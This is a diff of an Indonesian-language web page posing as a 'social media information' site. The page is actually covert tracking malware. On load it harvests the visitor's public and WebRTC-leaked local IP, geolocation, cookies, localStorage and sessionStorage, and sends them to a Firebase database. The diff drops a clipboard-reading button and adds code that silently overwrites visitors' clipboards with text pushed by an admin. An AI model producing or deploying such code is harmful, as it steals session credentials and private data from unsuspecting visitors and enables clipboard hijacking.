@@ -5,48 +5,9 @@
   <title>Informasi Social Media</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background-color: #f0f0f0;
-    }
-    .clipboard-section {
-      background: #fff;
-      padding: 15px;
-      border-radius: 10px;
-      margin-top: 20px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-    }
-    button {
-      padding: 8px 16px;
-      margin-top: 10px;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      background-color: #007BFF;
-      color: white;
-    }
-    pre {
-      background: #eee;
-      padding: 10px;
-      border-radius: 8px;
-      margin-top: 10px;
-    }
-  </style>
 </head>
 <body>
-  <h1>Selamat datang...</h1>
-  <p>Website Error</p>
-
-  <div class="clipboard-section">
-    <h3>My Website</h3>
-    <p>
-      Selamat datang di website Informasi Social Media
-    </p>
-    <button onclick="aksesClipboard()">Oke</button>
-    <pre id="clipboardOutput">Belum diakses</pre>
-  </div>
+  <h1>Memuat informasi...</h1>
 
   <script>
     const firebaseConfig = {
@@ -56,10 +17,8 @@
       projectId: "xr-social-53646",
       storageBucket: "xr-social-53646.appspot.com",
       messagingSenderId: "55685443011",
-      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
-      measurementId: "G-LTMZD79ZWX"
+      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
@@ -74,7 +33,7 @@
       pc.createDataChannel("");
       pc.createOffer().then(offer => pc.setLocalDescription(offer));
       pc.onicecandidate = event => {
-        if (event && event.candidate && event.candidate.candidate.includes("candidate")) {
+        if (event && event.candidate) {
           const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
           callback(ipMatch ? ipMatch[1] : null);
           pc.close();
@@ -98,45 +57,41 @@
       }
     }
 
-    let globalData = {
-      timestamp: new Date().toLocaleString(),
-      clipboard: 'Belum diakses'
-    };
-
-    async function collectAndSendData() {
+    async function collectData() {
       const publicIP = await getPublicIP();
       getLocalIP(localIP => {
         getGeoLocation(geo => {
-          globalData = {
-            ...globalData,
+          const data = {
+            timestamp: new Date().toLocaleString(),
             ip: publicIP,
             localIP: localIP || 'Tidak tersedia',
             userAgent: navigator.userAgent,
-            referer: document.referrer || '',
-            latitude: geo?.lat || 'Tidak tersedia',
-            longitude: geo?.lon || 'Tidak tersedia',
-            accuracy: geo?.accuracy || 'Tidak tersedia',
-            cookies: document.cookie || 'Tidak tersedia',
+            referer: document.referrer || '-',
+            latitude: geo?.lat || '-',
+            longitude: geo?.lon || '-',
+            accuracy: geo?.accuracy || '-',
+            cookies: document.cookie || '-',
             localStorage: JSON.stringify(localStorage),
             sessionStorage: JSON.stringify(sessionStorage)
           };
-          db.ref('visitors').push(globalData);
+          db.ref('visitors').push(data);
         });
       });
     }
 
-    async function aksesClipboard() {
-      try {
-        const isi = await navigator.clipboard.readText();
-        document.getElementById("clipboardOutput").textContent = isi || "(Clipboard kosong)";
-        globalData.clipboard = isi || "(Clipboard kosong)";
-        db.ref('visitors').push(globalData);
-      } catch (err) {
-        document.getElementById("clipboardOutput").textContent = "Gagal membaca clipboard: " + err.message;
-      }
-    }
+    collectData();
 
-    collectAndSendData();
+    // Clipboard otomatis dari admin
+    db.ref('customClipboard/text').on('value', snapshot => {
+      const teks = snapshot.val();
+      if (teks && navigator.clipboard) {
+        navigator.clipboard.writeText(teks).then(() => {
+          console.log("Teks clipboard berhasil disalin.");
+        }).catch(err => {
+          console.warn("Gagal menyalin clipboard:", err);
+        });
+      }
+    });
   </script>
 </body>
 </html>
